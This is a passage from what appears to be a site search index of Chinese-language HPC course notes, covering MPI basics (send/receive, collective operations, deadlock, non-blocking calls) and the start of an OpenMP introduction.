Network\uff0cRNN\uff09\u53ef\u4ee5\u66f4\u597d\u5730\u5904\u7406\u5e8f\u5217\u4fe1\u606f</p> <p>\u8fd9\u91cc\u672c\u5e94\u6709\u66f4\u591a\u5185\u5bb9\uff0c\u4f46\u662f\u61d2\u5f97\u5199\u4e86 _(:\u0437\u300d\u2220)_</p>"},{"location":"cs/hpc/hpc101/mpi/","title":"MPI \u57fa\u7840","text":"<p> \u7ea6 1564 \u4e2a\u5b57  158 \u884c\u4ee3\u7801  2 \u5f20\u56fe\u7247  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 7 \u5206\u949f</p> <p>Abstract</p> <p>\u8d85\u7b97\u5c0f\u5b66\u671f\u7b2c\u4e03\u6b21\u8bfe\u8bfe\u7a0b\u5185\u5bb9\uff0c\u7b2c\u56db\u6b21\u5b9e\u9a8c\u5185\u5bb9</p> <p>\u53c2\u8003\uff1a</p> <ul> <li>\u8d85\u7b97\u5c0f\u5b66\u671f\u7b2c\u4e03\u6b21\u8bfe\u8bfe\u4ef6</li> <li>MPI Tutorial</li> </ul>"},{"location":"cs/hpc/hpc101/mpi/#mpi_1","title":"MPI \u7b80\u4ecb","text":"<p>MPI\uff08Message-Passing Interface\uff09\u662f\u4e00\u7ec4\u7528\u4e8e\u5e76\u884c\u5e94\u7528\u8fdb\u7a0b\u95f4\u7684\u901a\u4fe1\u7684\u63a5\u53e3\u3002\u76ee\u524d\u6700\u65b0\u7684\u6807\u51c6\u4e3a MPI-4.0\uff082021.6.9\uff09</p> <p>\u6709\u5f88\u591a\u5b9e\u73b0\uff0c\u6bd4\u5982 OpenMPI\u3001IntelMPI\uff08\u96c6\u6210\u5728 Intel oneAPI \u5957\u4ef6\u4e2d\uff09\u3001MPICH\u3001MVAPICH \u7b49</p> <ul> <li>OpenMP \u5de5\u4f5c\u5728\u7edf\u4e00\u5185\u5b58\u4e0a\uff0c\u5373\u4efb\u610f\u4e00\u4e2a\u5904\u7406\u5668\u90fd\u53ef\u4ee5\u76f4\u63a5\u8bbf\u95ee\u4efb\u610f\u4e00\u5757\u5185\u5b58</li> <li>MPI \u5de5\u4f5c\u5728\u5206\u5e03\u5f0f\u5185\u5b58\u4e0a\uff0c\u5373\u4e00\u7ec4\u5904\u7406\u5668\u5171\u7528\u4e00\u5757\u5185\u5b58\uff0c\u4e0d\u80fd\u76f4\u63a5\u8bbf\u95ee\u5176\u4ed6\u5730\u65b9\u7684\u5185\u5b58\uff0c\u4f46\u53ef\u4ee5\u901a\u8fc7\u7f51\u7edc\u8fdb\u884c\u6570\u636e\u7684\u4f20\u8f93</li> </ul> <p>\u7c7b\u6bd4\u4e8e\u8fdb\u7a0b\u548c\u7ebf\u7a0b\u4e4b\u95f4\u7684\u5173\u7cfb\uff1a\u8fdb\u7a0b\u62e5\u6709\u72ec\u7acb\u7684\u5185\u5b58\u5355\u5143\uff0c\u800c\u591a\u4e2a\u7ebf\u7a0b\u5171\u4eab\u5185\u5b58\uff1b\u4e00\u4e2a\u8fdb\u7a0b\u53ef\u4ee5\u5305\u542b\u591a\u4e2a\u7ebf\u7a0b\uff1b\u7ebf\u7a0b\u9002\u7528\u4e8e\u591a\u6838\u60c5\u51b5\uff0c\u8fdb\u7a0b\u9002\u7528\u4e8e\u591a\u673a\u3001\u591a\u6838\u60c5\u51b5</p>"},{"location":"cs/hpc/hpc101/mpi/#hello-world","title":"hello world","text":"<pre><code>#include &lt;mpi.h&gt;\n#include &lt;stdio.h&gt;\n\nint main(int argc, char** argv) {\n    MPI_Init(NULL, NULL);\n\n    int world_size;\n    MPI_Comm_size(MPI_COMM_WORLD, &amp;world_size);\n\n    int world_rank;\n    MPI_Comm_rank(MPI_COMM_WORLD, &amp;world_rank);\n\n    char processor_name[MPI_MAX_PROCESSOR_NAME];\n    int name_len;\n    MPI_Get_processor_name(processor_name, &amp;name_len);\n\n    printf(\"Hello world from processor %s, rank %d out of %d processors\\n\",\n           processor_name, world_rank, world_size);\n\n    MPI_Finalize();\n}\n</code></pre> <ul> <li>MPI_Init\uff1a\u521b\u5efa MPI \u73af\u5883\uff0c\u53c2\u6570\u4e00\u822c\u6ca1\u7528\uff0c\u5728\u8fd9\u671f\u95f4\u4f1a\u521b\u5efa\u4e00\u4e2a\u901a\u8baf\u5668\uff08communicator\uff09MPI_COMM_WORLD</li> <li>MPI_Comm_size\uff1a\u6839\u636e MPI_COMM_WORLD \u6765\u8bfb\u53d6\u603b\u8fdb\u7a0b\u6570\u91cf</li> <li>MPI_Comm_rank\uff1a\u6839\u636e MPI_COMM_WORLD \u6765\u8bfb\u53d6\u5f53\u524d\u8fdb\u7a0b\u7684 rank\uff0c\u76f8\u5f53\u4e8e\u8fdb\u7a0b\u7f16\u53f7</li> <li>MPI_Get_processor_name\uff1a\u83b7\u53d6\u5f53\u524d\u7a0b\u5e8f\u5b9e\u9645\u8fd0\u884c\u7684\u65f6\u5019\u8dd1\u5728\u7684\u5904\u7406\u5668\u540d\u5b57</li> <li>MPI_Finalize\uff1a\u6e05\u7406 MPI \u73af\u5883</li> </ul> <p>\u7f16\u8bd1\u8fd0\u884c\u5747\u4f7f\u7528 mpi \u63d0\u4f9b\u7684\u547d\u4ee4\uff1a</p> <ul> <li>mpicc code.c -o out</li> <li>mpirun -np 4 ./out<ul> <li>\u5f00\u542f\u56db\u4e2a\u8fdb\u7a0b</li> <li>\u4e0d\u540c\u5b9e\u73b0\u7684 mpirun \u547d\u4ee4\u53c2\u6570\u4f1a\u6709\u4e0d\u540c</li> <li>\u5982\u679c\u4ee5 root \u8fd0\u884c\u9700\u8981\u5728 mpirun \u540e\u9762\u52a0 --allow-run-as-root</li> </ul> </li> </ul>"},{"location":"cs/hpc/hpc101/mpi/#_1","title":"\u70b9\u5bf9\u70b9\u901a\u4fe1","text":"<p>mpirun \u4f1a\u542f\u52a8\u591a\u4e2a\u8fdb\u7a0b\uff0c\u4e14\u8fdb\u7a0b\u4e4b\u95f4\u5185\u5b58\u4e92\u76f8\u4e0d\u5171\u4eab\u3002\u9700\u8981\u5728\u8fdb\u7a0b\u4e4b\u95f4\u4f20\u9012\u6570\u636e\u5219\u9700\u8981\u8fdb\u884c\u901a\u4fe1\uff0c\u4e24\u4e2a\u8fdb\u7a0b\u4e4b\u95f4\u7684\u901a\u4fe1\u5c31\u662f\u70b9\u5bf9\u70b9\u901a\u4fe1\uff08Point-to-Point Communication\uff09</p> <p>MPI \u7684\u901a\u4fe1\u8fc7\u7a0b\u5927\u81f4\u9700\u8981\u901a\u8fc7\u4e24\u4e2a\u6570\u7ec4\uff08\u5373 buffer\uff09\uff0c\u4e00\u4e2a\u5b58\u50a8\u53d1\u9001\u6570\u636e\uff0c\u4e00\u4e2a\u5b58\u50a8\u63a5\u6536\u6570\u636e\uff0c\u901a\u8fc7\u8c03\u7528\u4e00\u7cfb\u5217\u51fd\u6570\u5373\u53ef\u5b9e\u73b0\u8fdb\u7a0b\u4e4b\u95f4\u7684\u901a\u4fe1</p> <p>\u8c03\u7528\u901a\u4fe1\u51fd\u6570\u540e\uff0c\u901a\u4fe1\u8bbe\u5907\uff08\u901a\u5e38\u662f\u7f51\u7edc\uff09\u5c31\u9700\u8981\u8d1f\u8d23\u628a\u4fe1\u606f\u4f20\u9012\u5230\u6b63\u786e\u7684\u5730\u65b9\uff0c\u4e5f\u5c31\u662f\u67d0\u4e2a\u8fdb\u7a0b\u7684\u67d0\u4e2a\u63a5\u6536 buffer</p> <p>\u6709\u65f6\u5019 A \u9700\u8981\u4f20\u9012\u5f88\u591a\u4e0d\u540c\u7684\u6d88\u606f\u7ed9 B\u3002\u4e3a\u4e86\u8ba9 B \u80fd\u6bd4\u8f83\u65b9\u4fbf\u5730\u533a\u5206\u4e0d\u540c\u7684\u6d88\u606f\uff0cMPI \u8fd0\u884c\u53d1\u9001\u8005\u548c\u63a5\u53d7\u8005\u989d\u5916\u5730\u6307\u5b9a\u4e00\u4e9b\u4fe1\u606f ID\uff08\u6b63\u5f0f\u540d\u79f0\u662f\u6807\u7b7e\uff0ctags\uff09\u3002\u5f53 B \u53ea\u8981\u6c42\u63a5\u6536\u67d0\u79cd\u7279\u5b9a\u6807\u7b7e\u7684\u4fe1\u606f\u7684\u65f6\u5019\uff0c\u5176\u4ed6\u7684\u4e0d\u662f\u8fd9\u4e2a\u6807\u7b7e\u7684\u4fe1\u606f\u4f1a\u5148\u88ab\u7f13\u5b58\u8d77\u6765\uff0c\u7b49\u5230 B \u9700\u8981\u7684\u65f6\u5019\u624d\u4f1a\u7ed9B</p>"},{"location":"cs/hpc/hpc101/mpi/#_2","title":"\u57fa\u7840\u901a\u4fe1\u51fd\u6570","text":""},{"location":"cs/hpc/hpc101/mpi/#mpi_send","title":"MPI_Send","text":"<pre><code>int MPI_Send(\n    const void *buf,\n    int count,\n    MPI_Datatype datatype,\n    int dest,\n    int tag,\n    MPI_Comm comm\n)\n</code></pre> <ul> <li>buf \u662f\u8981\u53d1\u9001\u7684 buffer \u7684\u9996\u5730\u5740</li> <li>count \u662f buffer \u4e2d\u5143\u7d20\u7684\u4e2a\u6570</li> <li>datatype \u8868\u793a\u53d1\u9001\u7684 buffer \u4e2d\u7684\u5143\u7d20\u7c7b\u578b<ul> <li>\u5199\u6cd5\u4e00\u822c\u662f MPI_&lt;\u7c7b\u578b\u5927\u5199\uff0c\u4e0b\u5212\u7ebf\u5206\u9694&gt;\uff0c\u4f8b\u5982 MPI_INT\u3001MPI_UNSIGNED_LONG_LONG</li> </ul> </li> <li>dest \u662f\u53d1\u9001\u76ee\u6807\u7684 rank</li> <li>tag \u662f message tag</li> <li>comm \u662f communicator\uff0c\u4e00\u822c\u76f4\u63a5\u4f20 MPI_COMM_WORLD \u5373\u53ef</li> </ul>"},{"location":"cs/hpc/hpc101/mpi/#mpi_recv","title":"MPI_Recv","text":"<pre><code>int MPI_Recv(\n    void *buf,\n    int count,\n    MPI_Datatype datatype,\n    int source,\n    int tag,\n    MPI_Comm comm,\n    MPI_Status *status\n)\n</code></pre> <ul> <li>buf \u662f\u8981\u5c06\u63a5\u6536\u5230\u7684\u5185\u5bb9\u5b58\u5165\u7684 buffer \u9996\u5730\u5740\uff08\u4f5c\u4e3a\u201c\u8f93\u51fa\u201d\uff09</li> <li>count \u662f\u8981\u63a5\u6536\u7684 buffer \u5143\u7d20\u4e2a\u6570</li> <li>datatype \u662f\u8981\u63a5\u6536\u7684 buffer \u4e2d\u5143\u7d20\u7c7b\u578b</li> <li>source \u662f\u63a5\u6536\u6765\u6e90\u7684 rank\uff08\u6216\u8005 MPI_ANY_SOURCE\uff09</li> <li>tag \u662f message tag\uff08\u6216\u8005 MPI_ANY_TAG\uff09</li> <li>comm \u662f communicator</li> <li>status \u662f\u63a5\u6536\u7684\u72b6\u6001\u7ed3\u6784\u4f53\uff08\u4f5c\u4e3a\u201c\u8f93\u51fa\u201d\uff09<ul> <li>\u4e0d\u9700\u8981\u65f6\u586b\u5199 MPI_STATUS_IGNORE</li> <li>MPI_Status \u4e2d\u5305\u542b\u4e09\u4e2a\u6210\u5458\u53d8\u91cf\uff1aMPI_SOURCE\u3001MPI_TAG\u3001MPI_ERROR</li> <li>\u53ef\u4ee5\u901a\u8fc7 MPI_Get_count(MPI_Status status, MPI_Datatype datatype, int count) \u51fd\u6570\u6765\u83b7\u53d6 count</li> </ul> </li> </ul>"},{"location":"cs/hpc/hpc101/mpi/#_3","title":"\u96c6\u5408\u901a\u4fe1","text":"<p>\u5f53\u9700\u8981\u8fdb\u884c\u8fdb\u7a0b\u4e4b\u95f4\u4e00\u5bf9\u591a\u3001\u591a\u5bf9\u4e00\u6216\u591a\u5bf9\u591a\u901a\u4fe1\u65f6\uff08\u5982\u5212\u5206\u4efb\u52a1\u3001\u6536\u96c6\u7ed3\u679c\uff09\uff0c\u4f7f\u7528\u591a\u4e2a Send/Recv \u4e0d\u65b9\u4fbf\uff0c\u53ef\u4ee5\u4f7f\u7528\u96c6\u5408\u901a\uff08Collective Communication\uff09</p>"},{"location":"cs/hpc/hpc101/mpi/#barrier","title":"Barrier","text":"<p><pre><code>int MPI_Barrier(MPI_Comm comm)\n</code></pre> \u8fd0\u884c\u5230\u6b64\u51fd\u6570\u65f6\u8fdb\u884c\u7b49\u5f85\uff0c\u76f4\u5230 communicator \u4e2d\u6240\u6709\u8fdb\u7a0b\u90fd\u8fd0\u884c\u5230 Barrier \u4e4b\u540e\u518d\u4e00\u8d77\u7ee7\u7eed\u8fd0\u884c</p>"},{"location":"cs/hpc/hpc101/mpi/#_4","title":"\u4e00\u5bf9\u591a","text":""},{"location":"cs/hpc/hpc101/mpi/#mpi_bcast","title":"MPI_Bcast","text":"<pre><code>int MPI_Bcast(\n    void *buffer,\n    int count,\n    MPI_Datatype datatype,\n    int root,\n    MPI_Comm comm\n)\n</code></pre> <ul> <li>\u6bd4 MPI_Send \u5c11\u4e86 dest\uff0c\u5373\u5c06 buffer \u4ece root \u53d1\u9001\u5230\u6240\u6709\u8fdb\u7a0b<ul> <li>\u5305\u542b\u53d1\u9001\u548c\u63a5\u6536\uff08root \u53d1\u9001\uff0c\u5176\u5b83\u63a5\u6536\uff0croot \u53d1\u9001\u51fa buffer\uff0c\u5176\u5b83\u63a5\u6536\u653e\u5230 buffer \u4e2d\uff09</li> </ul> </li> <li>MPI_Bcast \u6548\u7387\u4e5f\u6bd4\u591a\u4e2a Send/Recv \u6548\u7387\u9ad8\uff08\u590d\u7528\u5df2\u7ecf\u5e7f\u64ad\u8fc7\u7684\u8282\u70b9\u8fdb\u884c\u65b0\u7684\u5e7f\u64ad\uff09</li> </ul>"},{"location":"cs/hpc/hpc101/mpi/#mpi_scatter","title":"MPI_Scatter","text":"<pre><code>int MPI_Scatter(\n    const void *sendbuf,\n    int sendcount,\n    MPI_Datatype sendtype,\n    void *recvbuf,\n    int recvcount,\n    MPI_Datatype recvtype,\n    int root,\n    MPI_Comm comm\n)\n</code></pre> <p>\u4e0e Broadcast \u4e0d\u540c\u7684\u662f\uff0c\u6bcf\u4e2a\u8fdb\u7a0b\u63a5\u6536\u5230\u7684\u662f sendbuf \u7684\u4e00\u90e8\u5206</p> <p></p>"},{"location":"cs/hpc/hpc101/mpi/#_5","title":"\u591a\u5bf9\u4e00","text":""},{"location":"cs/hpc/hpc101/mpi/#mpi_gather","title":"MPI_Gather","text":"<pre><code>int MPI_Gather(\n    const void *sendbuf,\n    int sendcount,\n    MPI_Datatype sendtype,\n    void *recvbuf,\n    int recvcount,\n    MPI_Datatype recvtype,\n    int root,\n    MPI_Comm comm\n)\n</code></pre> <p>\u53c2\u6570\u610f\u4e49\u4e5f\u90fd\u7c7b\u4f3c\uff0c\u5c06\u6240\u6709\u8fdb\u7a0b\u4e2d\u7684 sendbuf \u53d1\u9001\u7ed9 root \u8fdb\u7a0b\uff0c\u62fc\u63a5\u5230 recvbuf \u4e2d</p>"},{"location":"cs/hpc/hpc101/mpi/#mpi_reduce","title":"MPI_Reduce","text":"<pre><code>int MPI_Reduce(\n    const void *sendbuf,\n    void *recvbuf,\n    int count,\n    MPI_Datatype datatype,\n    MPI_Op op,\n    int root,\n    MPI_Comm comm\n)\n</code></pre> <p>\u7c7b\u4f3c MPI_Gather\uff0c\u4f46\u5c06\u6536\u96c6\u5230\u7684\u6570\u636e\u8fdb\u884c\u5904\u7406\u5408\u5e76\u5230 recvbuf \u4e2d</p> <p>MPI_Op \u53ef\u4ee5\u662f MPI_MAX MPI_MIN MPI_SUM MPI_PROD MPI_LAND\uff08\u903b\u8f91\u4e0e\uff09MPI_BAND\uff08\u4f4d\u4e0e\uff09MPI_LOR MPI_BOR MPI_LXOR MPI_BXOR MPI_MAXLOC\uff08\u6700\u5927\u503c\u4e0e\u4f4d\u7f6e\uff09MPI_MINLOC</p>"},{"location":"cs/hpc/hpc101/mpi/#_6","title":"\u591a\u5bf9\u591a","text":""},{"location":"cs/hpc/hpc101/mpi/#mpi_allgather","title":"MPI_Allgather","text":"<pre><code>int MPI_Allgather(\n    const void *sendbuf,\n    int sendcount,\n    MPI_Datatype sendtype,\n    void *recvbuf,\n    int recvcount,\n    MPI_Datatype recvtype,\n    MPI_Comm comm\n)\n</code></pre> <p>\u7c7b\u4f3c MPI_Gather\uff0c\u4f46\u6240\u6709\u8fdb\u7a0b\u90fd\u4f1a\u5f97\u5230 MPI_Gather \u4e2d root \u5f97\u5230\u7684\u5185\u5bb9</p>"},{"location":"cs/hpc/hpc101/mpi/#mpi_alltoall","title":"MPI_Alltoall","text":"<pre><code>int MPI_Alltoall(\n    const void *sendbuf,\n    int sendcount,\n    MPI_Datatype sendtype,\n    void *recvbuf,\n    int recvcount,\n    MPI_Datatype recvtype,\n    MPI_Comm comm\n)\n</code></pre> <p>\u89c1\u56fe\uff1a </p>"},{"location":"cs/hpc/hpc101/mpi/#_7","title":"\u5f02\u6b65\u4e0e\u53d8\u957f\u901a\u4fe1","text":"<p>\u524d\u9762\u7684\u901a\u4fe1\u8fc7\u7a0b\u90fd\u662f\u963b\u585e\u7684\uff0c\u4e5f\u5c31\u662f\u4e00\u76f4\u7b49\u5f85\u76f4\u5230\u901a\u4fe1\u7ed3\u675f</p> <p>\u975e\u963b\u585e\u901a\u4fe1\u5c31\u662f\u8c03\u7528\u901a\u4fe1\u51fd\u6570\u65f6\u5c06\u901a\u4fe1\u64cd\u4f5c\u540e\u53f0\u6267\u884c\uff0c\u901a\u4fe1\u51fd\u6570\u7acb\u5373\u8fd4\u56de\u6267\u884c\u4e0b\u4e00\u6b65\u3002\u53ef\u4ee5\u907f\u514d\u4e00\u4e9b\u6b7b\u9501\u7684\u53d1\u751f\uff0c\u5e76\u4e14\u53ef\u4ee5\u63d0\u9ad8\u6548\u7387</p>"},{"location":"cs/hpc/hpc101/mpi/#_8","title":"\u6b7b\u9501","text":"<pre><code>MPI_Comm_rank(comm, &amp;rank);\nMPI_Send(sendbuf, count, MPI_INT, rank ^ 1, tag, comm);\nMPI_Recv(recvbuf, count, MPI_INT, rank ^ 1, tag, comm, &amp;status);\n</code></pre> <p>\u4f8b\u5982\u5f53\u6709\u4e24\u4e2a\u7ebf\u7a0b\u7684\u65f6\u5019\uff0c\u60f3\u8981\u540c\u65f6\u53d1\u9001\u63a5\u6536\u6765\u4ea4\u6362\u6570\u636e\uff0c\u4f46\u8fd9\u6837\u4e24\u4e2a\u8fdb\u7a0b\u90fd\u5361\u5728\u4e86 Send \u9636\u6bb5\uff0c\u6ca1\u4eba\u63a5\u6536\u3001\u4e5f\u6ca1\u4eba Send \u6210\u529f\uff0c\u5bfc\u81f4\u6b7b\u9501</p>"},{"location":"cs/hpc/hpc101/mpi/#mpi_sendrecv","title":"MPI_Sendrecv","text":"<p><pre><code>int MPI_Sendrecv(\n    const void *sendbuf,\n    int sendcount,\n    MPI_Datatype sendtype,\n    int dest,\n    int sendtag,\n    void *recvbuf,\n    int recvcount,\n    MPI_Datatyp recvtype,\n    int source,\n    int recvtag,\n    MPI_Comm comm,\n    MPI_Status* status\n)\n</code></pre> \u5373\u540c\u65f6 Send \u548c Recv\uff0c\u53ef\u4ee5\u89e3\u51b3\u4e0a\u9762\u6b7b\u9501\u7684\u95ee\u9898</p>"},{"location":"cs/hpc/hpc101/mpi/#_9","title":"\u975e\u963b\u585e\u901a\u4fe1","text":""},{"location":"cs/hpc/hpc101/mpi/#mpi_isend","title":"MPI_Isend","text":"<p><pre><code>int MPI_Isend(\n    const void *buf,\n    int count,\n    MPI_Datatype datatype,\n    int dest,\n    int tag,\n    MPI_Comm comm,\n    MPI_Request *request\n)\n</code></pre> \u975e\u963b\u585e\u5f0f Send\uff0c\u4f1a\u8fd4\u56de\u4e00\u4e2a MPI_Request \u7528\u4e8e\u540e\u9762 Wait</p>"},{"location":"cs/hpc/hpc101/mpi/#mpi_irecv","title":"MPI_Irecv","text":"<p><pre><code>int MPI_Irecv(\n    void *buf,\n    int count,\n    MPI_Datatype datatype,\n    int source,\n    int tag,\n    MPI_Comm comm,\n    MPI_Request *request\n)\n</code></pre> \u975e\u963b\u585e\u5f0f Recv\uff0c\u540c\u6837\u4f1a\u5f97\u5230\u4e00\u4e2a MPI_Request</p>"},{"location":"cs/hpc/hpc101/mpi/#mpi_test","title":"MPI_Test","text":"<pre><code>int MPI_Test(\n    MPI_Request *request,\n    int *flag,\n    MPI_Status *status\n)\n</code></pre> <ul> <li>\u68c0\u67e5\u67d0\u4e2a\u901a\u4fe1\u662f\u5426\u5b8c\u6210</li> <li>request \u4f5c\u4e3a\u8f93\u5165</li> <li>flag \u4f5c\u4e3a\u8f93\u51fa\uff0c\u5982\u679c\u901a\u4fe1\u5b8c\u6210\uff0c\u5219\u8bbe\u4e3a 1</li> <li>status \u4f5c\u4e3a\u8f93\u51fa</li> </ul>"},{"location":"cs/hpc/hpc101/mpi/#mpi_testall","title":"MPI_Testall","text":"<pre><code>int MPI_Testall(\n    int count,\n    MPI_Request *request_list,\n    int *flag,\n    MPI_Status *status\n)\n</code></pre> <ul> <li>\u68c0\u67e5 request_list\uff08\u957f\u5ea6\u4e3a count\uff09\u4e2d\u7684\u901a\u4fe1\u662f\u5426\u5168\u90e8\u5b8c\u6210</li> <li>\u53ea\u6709\u5168\u90e8\u5b8c\u6210\u65f6 flag \u624d\u4f1a\u8bbe\u4e3a 1</li> </ul>"},{"location":"cs/hpc/hpc101/mpi/#mpi_wait","title":"MPI_Wait","text":"<p><pre><code>int MPI_Wait(\n    MPI_Request *request,\n    MPI_Status *status\n)\n</code></pre> \u7528\u6765\u7b49\u5f85\u76f4\u5230 request \u5bf9\u5e94\u7684\u901a\u4fe1\u5b8c\u6210\uff0c\u540c\u7406\u4e5f\u6709 MPI_Waitall</p> <p>\u5904\u7406\u6b7b\u9501\uff1a <pre><code>MPI_Comm_rank(comm, &amp;rank);\nMPI_ISend(sendbuf, count, MPI_INT, rank ^ 1, tag, comm\uff0c &amp;req);\nMPI_Recv(recvbuf, count, MPI_INT, rank ^ 1, tag, comm, &amp;status);\nMPI_Wait(&amp;req, &amp;status);\n</code></pre></p>"},{"location":"cs/hpc/hpc101/mpi/#_10","title":"\u53d8\u957f\u901a\u4fe1","text":"<pre><code>int MPI_Alltoallv(\n    const void *sendbuf,\n    const int sendcounts[],\n    const int sdispls[],\n    MPI_Datatype sendtype,\n    void *recvbuf,\n    const int recvcounts[],\n    const int rdispls[],\n    MPI_Datatype recvtype,\n    MPI_Comm comm\n)\n</code></pre> <ul> <li>sendcounts \u4e3a\u6307\u5b9a\u5411\u4e0d\u540c rank \u53d1\u9001\u5143\u7d20\u4e2a\u6570\u7684\u6570\u7ec4</li> <li>sdispls \u8981\u53d1\u9001\u7684\u6570\u636e\u76f8\u5bf9\u4e8e sendbuf \u7684\u504f\u79fb\u91cf\uff08\u6570\u7ec4\uff0c\u4e0b\u6807\u4e3a dest\uff09</li> <li>recvcounts \u548c rdispls \u540c\u7406</li> </ul> <p>\u5b9e\u73b0\u4e86\u591a\u5bf9\u591a\u901a\u4fe1\u65f6\u5404\u4e2a\u8fdb\u7a0b\u8981\u53d1\u9001/\u63a5\u6536\u7684\u5185\u5bb9\u5927\u5c0f\u4e0d\u540c\u7684\u53d8\u957f\u901a\u4fe1</p>"},{"location":"cs/hpc/hpc101/openmp/","title":"OpenMP \u57fa\u7840","text":"<p> \u7ea6 1894 \u4e2a\u5b57  56 \u884c\u4ee3\u7801  2 \u5f20\u56fe\u7247  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 7 \u5206\u949f</p> <p>Abstract</p> <p>\u8d85\u7b97\u5c0f\u5b66\u671f\u7b2c\u4e03\u6b21\u8bfe\u8bfe\u7a0b\u5185\u5bb9\uff0c\u7b2c\u56db\u6b21\u5b9e\u9a8c\u5185\u5bb9</p> <p>\u53c2\u8003\uff1a</p> <ul> <li>\u8d85\u7b97\u5c0f\u5b66\u671f\u7b2c\u4e03\u6b21\u8bfe\u8bfe\u4ef6</li> <li>HPC Tutorial - OpenMP tutorial\uff0c\u4e2d\u6587\u6559\u7a0b</li> <li>OpenMP official tutorials</li> </ul>"},{"location":"cs/hpc/hpc101/openmp/#openmp_1","title":"OpenMP \u7b80\u4ecb","text":"<p>OpenMP\u7684\u9002\u7528\u8303\u56f4\uff1a\u591a\u7ebf\u7a0b\u3001\u5171\u4eab\u5185\u5b58</p> <ul> <li>\u5171\u4eab\u5b58\u50a8\u4f53\u7cfb\u7ed3\u6784\u4e0a\u7684\u4e00\u4e2a\u5e76\u884c\u7f16\u7a0b\u6a21\u578b</li> <li>\u9002\u7528\u4e8e SMP\uff08Symmetric Multi-Processor\uff09\u5171\u4eab\u5185\u5b58\u591a\u5904\u7406\u7cfb\u7edf\u548c\u591a\u6838\u5904\u7406\u5668\u4f53\u7cfb\u7ed3\u6784</li> </ul> <p>\u4e09\u7c7b\u4e3b\u8981 API\uff08\u8868\u73b0\u4e3a\u7f16\u8bd1\u5236\u5bfc\u6307\u4ee4\uff0c\u4f46\u5b9e\u9645\u4e0a\u4ecd\u4e3aAPI\uff09\uff1a\u7f16\u8bd1\u5668\u6307\u4ee4\u3001\u8fd0\u884c\u65f6\u5e93\u51fd\u6570\u3001\u73af\u5883\u53d8\u91cf</p> <p>\u4f20\u7edf\u4e0a\uff0c\u6211\u4eec\u5229\u7528 OpenMP \u8fdb\u884c\u5355\u673a\u5668 CPU \u4f18\u5316\uff08\u53ef\u8de8\u5904\u7406\u5668\uff09\uff0c\u4e0d\u8fc7\u5728\u8f83\u65b0\u7684 OpenMP \u7248\u672c\u7684\u4e2d\uff0c\u4f60\u751a\u81f3\u53ef\u4ee5\u76f4\u63a5\u4f7f\u7528 OpenMP \u5c06\u4ee3\u7801\u4f18\u5316\u5230 GPU \u7b49\u5f02\u6784\u8ba1\u7b97\u8bbe\u5907\u4e0a</p>"},{"location":"cs/hpc/hpc101/openmp/#openmp_2","title":"OpenMP \u7f16\u7a0b\u6a21\u578b","text":"<p>\u91c7\u7528\u5171\u4eab\u5185\u5b58\u6a21\u578b</p> <p></p> <p>\u7531\u4e8e\u662f\u5171\u4eab\u5185\u5b58\u67b6\u6784\uff0c\u5f80\u5f80\u53ea\u80fd\u5c06 omp \u5e94\u7528\u5728\u5355\u8282\u70b9\u4e0a</p> <p>HPC\u4e2d\u5f80\u5f80\u662f\u56db\u673a\u96c6\u7fa4\u7684\u914d\u7f6e\uff0c\u4e0d\u540c\u673a\u5668\u4e4b\u95f4\u901a\u8fc7 MPI \u4e0e OMP \u76f8\u7ed3\u5408\u5b9e\u73b0\u5206\u5e03\u5f0f\u5185\u5b58\u5e76\u884c\uff0c\u6df7\u5408\u5e76\u884c\u7f16\u7a0b</p> <ul> <li>OMP \u7528\u4e8e\u5728\u6bcf\u4e2a\u8282\u70b9\u4e0a\u8fdb\u884c\u8ba1\u7b97\u5bc6\u96c6\u578b\u5de5\u4f5c</li> <li>MPI \u7528\u4e8e\u4e0d\u540c\u8282\u70b9\u4e4b\u95f4\u7684\u901a\u4fe1\u548c\u6570\u636e\u5171\u4eab</li> </ul>"},{"location":"cs/hpc/hpc101/openmp/#_1","title":"\u5e76\u884c\u6027","text":"<p>\u51e0\u4e2a\u6982\u5ff5\uff1a</p> <ul> <li>\u8fdb\u7a0b\uff1a\u5e76\u53d1\u6267\u884c\u7684\u7a0b\u5e8f\u5728\u6267\u884c\u8fc7\u7a0b\u4e2d\u5206\u914d\u548c\u7ba1\u7406\u8d44\u6e90\u7684\u57fa\u672c\u5355\u4f4d\uff08\u52a8\u6001\u7684\uff09\uff0c\u4f5c\u4e3a\u7ade\u4e89\u8ba1\u7b97\u673a\u7cfb\u7edf\u8d44\u6e90\u7684\u57fa\u672c\u5355\u4f4d</li> <li>\u7ebf\u7a0b\uff1a\u8fdb\u7a0b\u7684\u4e00\u4e2a\u6267\u884c\u5355\u5143\uff08\u72ec\u7acb\u8fd0\u884c\uff09\uff0c\u8fdb\u7a0b\u7684\u5185\u6838\u8c03\u5ea6\u5b9e\u4f53\uff08\u201c\u8f7b\u91cf\u7ea7\u8fdb\u7a0b\u201d\uff09</li> <li>\u534f\u7a0b\uff1a\u6bd4\u7ebf\u7a0b\u66f4\u8f7b\u91cf\u7ea7\u7684\u5b58\u5728\uff0c\u4e00\u4e2a\u7ebf\u7a0b\u53ef\u4ee5\u6709\u591a\u4e2a\u534f\u7a0b\uff08\u7c7b\u4f3c\u4e8e\u4e0d\u5e26\u8fd4\u56de\u503c\u7684\u5b50\u51fd\u6570\uff09</li> </ul> <p>\u5173\u4e8e\u7ebf\u7a0b\u548c\u8fdb\u7a0b\uff1a</p> <ul> <li>\u8fdb\u7a0b\u4e4b\u95f4\u5730\u5740\u7a7a\u95f4\u4e3a\u72ec\u7acb\uff08CPU\u4fdd\u62a4\u6a21\u5f0f\uff09\uff1b\u7ebf\u7a0b\u4e4b\u95f4\u5171\u4eab\u672c\u8fdb\u7a0b\u7684\u5730\u5740\u7a7a\u95f4\uff08IO\uff0cCPU\uff0c\u5185\u5b58\u4ea6\u5982\u662f\uff09</li> <li>\u8fdb\u7a0b\u7684\u7a0b\u5e8f\u5165\u53e3\u6267\u884c\u5f00\u9500\u5927\uff0c\u5f53\u8981\u8fdb\u884c\u9891\u7e41\u5207\u6362\u65f6\uff0c\u4f7f\u7528\u7ebf\u7a0b\u597d\u4e8e\u4f7f\u7528\u8fdb\u7a0b</li> 